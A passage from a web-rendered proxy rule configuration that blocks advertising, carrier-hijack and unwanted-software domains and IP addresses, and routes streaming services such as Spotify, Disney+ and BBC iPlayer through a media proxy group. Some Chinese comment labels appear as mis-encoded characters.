DOMAIN-SUFFIX,91veg.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,9s6q.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,adsame.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,aiclk.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,akuai.top,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,atplay.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,baiwanchuangyi.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,beerto.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,beilamusi.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,benshiw.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,bianxianmao.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,bryonypie.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,cishantao.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,cszlks.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,cudaojia.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,dafapromo.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,daitdai.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,dsaeerf.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,dugesheying.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,dv8c1t.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,echatu.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,erdoscs.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,fan-yong.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,feih.com.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,fjlqqc.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,fkku194.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,freedrive.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,gclick.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,goufanli100.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,goupaoerdai.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,gouwubang.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,gzxnlk.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,haoshengtoys.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,hyunke.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ichaosheng.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ishop789.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,jdkic.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,jiubuhua.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,jsncke.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,junkucm.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,jwg365.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,kawo77.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,kualianyingxiao.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,kumihua.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ltheanine.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,maipinshangmao.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,minisplat.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mkitgfs.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mlnbike.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mobjump.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,nbkbgd.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,newapi.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,pinzhitmall.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,poppyta.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,qianchuanghr.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,qichexin.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,qinchugudao.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,quanliyouxi.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,qutaobi.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ry51w.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sg536.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifubo.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuce.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuda.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifufu.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuge.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifugu.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuhe.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuhu.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuji.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuka.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,smgru.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,taoggou.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,tcxshop.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,tjqonline.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,topitme.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,tt3sm4.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,tuia.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,tuipenguin.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,tuitiger.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,websd8.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,wsgblw.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,wx16999.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,xchmai.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,xiaohuau.xyz,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ygyzx.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,yinmong.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,yitaopt.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,yjqiqi.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,yukhj.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zhaozecheng.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zhenxinet.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zlne800.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zunmi.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zzd6.com,REJECT</span><br><span class="line">- IP-CIDR,39.107.15.115/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,47.89.59.182/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,103.49.209.27/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,123.56.152.96/32,REJECT,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ChinaTelecom</span></span><br><span class="line">- IP-CIDR,61.160.200.223/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,61.160.200.242/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,61.160.200.252/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,61.174.50.214/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,111.175.220.163/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,111.175.220.164/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,122.229.8.47/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,122.229.29.89/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,124.232.160.178/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,175.6.223.15/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,183.59.53.237/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,218.93.127.37/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,221.228.17.152/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,221.231.6.79/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,222.186.61.91/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,222.186.61.95/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,222.186.61.96/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,222.186.61.97/32,REJECT,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ChinaUnicom</span></span><br><span class="line">- IP-CIDR,106.75.231.48/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,119.4.249.166/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,220.196.52.141/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,221.6.4.148/32,REJECT,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ChinaMobile</span></span><br><span class="line">- IP-CIDR,114.247.28.96/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,221.179.131.72/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,221.179.140.145/32,REJECT,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Dr.Peng</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- IP-CIDR,10.72.25.0/24,REJECT,no-resolve</span></span><br><span class="line">- IP-CIDR,115.182.16.79/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,118.144.88.126/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,118.144.88.215/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,118.144.88.216/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,120.76.189.132/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,124.14.21.147/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,124.14.21.151/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,180.166.52.24/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,211.161.101.106/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,220.115.251.25/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,222.73.156.235/32,REJECT,no-resolve</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Malware æ¶æ„ç½‘ç«™</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; å¿«å‹</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://zhuanlan.zhihu.com/p/39534279</span></span><br><span class="line">- DOMAIN-SUFFIX,kuaizip.com,REJECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; MacKeeper</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://www.lizhi.io/blog/40002904</span></span><br><span class="line">- DOMAIN-SUFFIX,mackeeper.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zryydi.com,REJECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Adobe Flash China Special Edition</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://www.zhihu.com/question/281163698/answer/441388130</span></span><br><span class="line">- DOMAIN-SUFFIX,flash.cn,REJECT</span><br><span class="line">- DOMAIN,geo2.adobe.com,REJECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; C&amp;J Marketing æ€æ°é©¬å…‹ä¸è½¯ä»¶</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://www.zhihu.com/question/46746200</span></span><br><span class="line">- DOMAIN-SUFFIX,4009997658.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,abbyychina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,bartender.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,betterzip.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,betterzipcn.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,beyondcompare.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,bingdianhuanyuan.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,chemdraw.com.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,cjmakeding.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,cjmkt.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,codesoftchina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,coreldrawchina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,crossoverchina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,dongmansoft.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,earmasterchina.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,easyrecoverychina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ediuschina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,flstudiochina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,formysql.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,guitarpro.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,huishenghuiying.com.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,hypersnap.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,iconworkshop.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,imindmap.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,jihehuaban.com.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,keyshot.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,kingdeecn.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,logoshejishi.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,luping.net.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mairuan.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mairuan.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mairuan.com.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mairuan.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mairuanwang.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,makeding.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mathtype.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mindmanager.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mindmanager.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mindmapper.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mycleanmymac.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,nicelabel.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ntfsformac.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ntfsformac.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,overturechina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,passwordrecovery.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,pdfexpert.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,photozoomchina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,shankejingling.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ultraiso.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,vegaschina.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,xmindchina.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,xshellcn.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,yihuifu.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,yuanchengxiezuo.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zbrushcn.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zhzzx.com,REJECT</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Global Area Network</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">(GlobalMedia)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">(Music)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Deezer</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Deezer*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,deezer.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,dzcdn.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; KKBOX</span></span><br><span class="line">- DOMAIN-SUFFIX,kkbox.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,kkbox.com.tw,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,kfs.io,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; JOOX</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,WeMusic*,GlobalMedia</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,JOOX*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,joox.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Pandora</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Pandora*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,pandora.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; SoundCloud</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,SoundCloud*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,p-cdn.us,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,sndcdn.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,soundcloud.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Spotify</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Spotify*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,pscdn.co,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,scdn.co,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,spotify.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,spoti.fi,GlobalMedia</span><br><span class="line">- DOMAIN-KEYWORD,spotify.com,GlobalMedia</span><br><span class="line">- DOMAIN-KEYWORD,-spotify-com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; TIDAL</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,TIDAL*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,tidal.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; YouTubeMusic</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,com.google.ios.youtubemusic*,GlobalMedia</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,YouTubeMusic*,GlobalMedia</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">(Video)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; All4</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,All4*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,c4assets.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,channel4.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; AbemaTV</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,AbemaTV*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,abema.io,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,ameba.jp,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,abema.tv,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,hayabusa.io,GlobalMedia</span><br><span class="line">- DOMAIN,abematv.akamaized.net,GlobalMedia</span><br><span class="line">- DOMAIN,ds-linear-abematv.akamaized.net,GlobalMedia</span><br><span class="line">- DOMAIN,ds-vod-abematv.akamaized.net,GlobalMedia</span><br><span class="line">- DOMAIN,linear-abematv.akamaized.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Amazon Prime Video</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,InstantVideo.US*,GlobalMedia</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Prime%20Video*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,aiv-cdn.net,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,aiv-delivery.net,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,amazonvideo.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,primevideo.com,GlobalMedia</span><br><span class="line">- DOMAIN,avodmp4s3ww-a.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,d25xi40x97liuc.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN,dmqdd6hw24ucf.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN,d22qjgkvxw22r6.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN,d1v5ir2lpwr8os.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN-KEYWORD,avoddashs,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Bahamut</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Anime*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,bahamut.com.tw,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,gamer.com.tw,GlobalMedia</span><br><span class="line">- DOMAIN,gamer-cds.cdn.hinet.net,GlobalMedia</span><br><span class="line">- DOMAIN,gamer2-cds.cdn.hinet.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; BBC iPlayer</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,BBCiPlayer*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,bbc.co.uk,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,bbci.co.uk,GlobalMedia</span><br><span class="line">- DOMAIN-KEYWORD,bbcfmt,GlobalMedia</span><br><span class="line">- DOMAIN-KEYWORD,uk-live,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; DAZN</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,DAZN*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,dazn.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,dazn-api.com,GlobalMedia</span><br><span class="line">- DOMAIN,d151l6v8er5bdm.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN-KEYWORD,voddazn,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Disney+</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Disney+*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,bamgrid.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,disney-plus.net,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,disneyplus.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,dssott.com,GlobalMedia</span><br><span class="line">- DOMAIN,cdn.registerdisney.go.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; encoreTVB</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,encoreTVB*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,encoretvb.com,GlobalMedia</span><br><span class="line">- DOMAIN,edge.api.brightcove.com,GlobalMedia</span><br><span class="line">- DOMAIN,bcbolt446c5271-a.akamaihd.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; FOX NOW</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,FOX%20NOW*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,fox.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,foxdcg.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,theplatform.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,uplynk.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; HBO NOW</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,HBO%20NOW*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,hbo.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,hbogo.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,hbonow.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; HBO GO HKG</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,HBO%20GO%20PROD%20HKG*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,hbogoasia.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,hbogoasia.hk,GlobalMedia</span><br><span class="line">- DOMAIN,bcbolthboa-a.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,players.brightcove.net,GlobalMedia</span><br><span class="line">- DOMAIN,s3-ap-southeast-1.amazonaws.com,GlobalMedia</span><br><span class="line">- DOMAIN,dai3fd1oh325y.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN,44wilhpljf.execute-api.ap-southeast-1.amazonaws.com,GlobalMedia</span><br><span class="line">- DOMAIN,hboasia1-i.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,hboasia2-i.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,hboasia3-i.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,hboasia4-i.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,hboasia5-i.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,cf-images.ap-southeast-1.prod.boltdns.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; åæ–‡ç”µè§†</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,HWTVMobile*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,5itv.tv,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,ocnttv.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Hulu</span></span><br><span class="line">- DOMAIN-SUFFIX,hulu.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,huluim.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,hulustream.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Hulu(ãƒ•ãƒ¼ãƒ«ãƒ¼)</span></span><br><span class="line">- DOMAIN-SUFFIX,happyon.jp,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,hulu.jp,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ITV</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,ITV_Player*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,itv.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,itvstatic.com,GlobalMedia</span><br><span class="line">- DOMAIN,itvpnpmobile-a.akamaihd.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; KKTV</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,KKTV*,GlobalMedia</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,com.kktv.ios.kktv*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,kktv.com.tw,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,kktv.me,GlobalMedia</span><br><span class="line">- DOMAIN,kktv-theater.kk.stream,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Line TV</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,LINE%20TV*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,linetv.tw,GlobalMedia</span><br><span class="line">- DOMAIN,d3c7rimkq79yfu.cloudfront.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; LiTV</span></span><br><span class="line">- DOMAIN-SUFFIX,litv.tv,GlobalMedia</span><br><span class="line">- DOMAIN,litvfreemobile-hichannel.cdn.hinet.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; My5</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,My5*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,channel5.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,my5.tv,GlobalMedia</span><br><span class="line">- DOMAIN,d349g9zuie06uo.cloudfront.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; myTV SUPER</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,mytv*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,mytvsuper.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,tvb.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Netflix</span></span><br><span class="line"><span class="meta"># </span><span 